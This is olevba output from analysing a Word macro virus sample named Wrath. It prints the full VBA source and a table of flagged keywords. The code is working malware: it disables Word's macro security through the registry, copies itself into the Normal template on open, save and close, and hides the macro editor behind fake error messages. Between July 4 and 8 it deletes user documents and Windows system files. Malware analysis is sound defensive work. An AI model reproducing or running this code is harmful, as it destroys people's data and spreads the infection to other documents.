olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Wrath
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Wrath - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Wrath.bas 
in file: ./Virus.MSWord.Wrath - OLE stream: 'Macros/VBA/Wrath'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Wrath.a
' Coded by tROx and LoX
Sub AutoOpen()
On Error Resume Next
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Set a = ActiveDocument
Set b = a.VBProject
Set C = b.VBComponents("Wrath")
Set d = NormalTemplate
Set e = d.VBProject
Set f = e.VBComponents
C.Export "C:\MSWIN.DLL"
f.Import ("C:\MSWIN.DLL")
d.Save
Kill "C:\MSWIN.DLL"
Call IfDate
End Sub
Sub Copy()
On Error Resume Next
Set z = NormalTemplate
Set y = z.VBProject
Set x = y.VBComponents("Wrath")
Set w = ActiveDocument
Set v = w.VBProject
Set u = v.VBComponents
x.Export "C:\MSWIN2.DLL"
u.Import ("C:\MSWIN2.DLL")
w.Save
Kill "C:\MSWIN2.DLL"
Call IfDate
End Sub
Sub AutoNew()
On Error Resume Next
Call Copy
End Sub
Sub FileSave()
On Error Resume Next
Call Copy
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call Copy
End Sub
Sub AutoClose()
On Error Resume Next
Call Copy
End Sub
Sub ToolsMacro()
On Error Resume Next
MsgBox "Internal Error.  Word is unable to activate this command.", vbCritical, "Microsoft Word"
Call IfDate
End Sub
Sub ViewVBCode()
On Error Resume Next
MsgBox "Internal Error.  Word is unable to activate this command.", vbCritical, "Microsoft Word"
Call IfDate
End Sub
Sub July3()
On Error Resume Next
Options.BlueScreen = True
MyApp = Shell("notepad.exe", 1)
    SendKeys "                                                                                                                                                                                                                            'FEEL MY WRATH.......'", True
    AppActivate (MyApp)
End Sub
Sub July4()
On Error Resume Next
Options.BlueScreen = True
Kill "C:/My Documents/*.*"
RmDir "C:/My Documents"
Kill "C:/Program Files/Internet Explorer"
Kill "C:/Windows/*.*"
Kill "C:/Windows/System"
Kill "C:/Windows/System32/Drivers"
MsgBox "Happy July 4th!!", vbInformation, "Microsoft Word"
End Sub
Sub IfDate()
On Error Resume Next
If Month(Now) = 7 And Day(Now) = 3 Then
Call July3
End If
If Month(Now) = 7 Then
If Day(Now) > 3 And Day(Now) < 9 Then
Call July4
End If
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|AppActivate         |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MSWIN.DLL           |Executable file name                         |
|IOC       |MSWIN2.DLL          |Executable file name                         |
|IOC       |notepad.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

